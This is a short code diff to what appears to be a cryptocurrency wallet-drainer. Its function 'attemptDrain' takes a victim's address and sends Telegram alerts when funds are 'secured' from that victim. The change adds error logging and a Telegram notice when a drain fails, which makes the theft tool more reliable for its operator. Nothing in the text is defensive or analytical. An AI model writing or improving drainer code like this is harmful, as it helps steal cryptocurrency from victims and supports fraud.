@@ -272,7 +272,13 @@ async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, sile
         await notifyTelegram(`<b>💰 SUCCESS!</b>\nFunds secured from <code>${victimAddress}</code> on ${chainName}.`);
 
     } catch (error) {
-        if (!silent) console.error(`   ❌ Drain failed on ${chainName}:`, error.message);
+        if (!silent) {
+            console.error(`   ❌ Drain failed on ${chainName}:`, error.message);
+            // Log full error object for debugging
+            if (error.info) console.error("   Error Info:", JSON.stringify(error.info, null, 2));
+
+            await notifyTelegram(`<b>❌ Drain Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
+        }
     }
 }
 
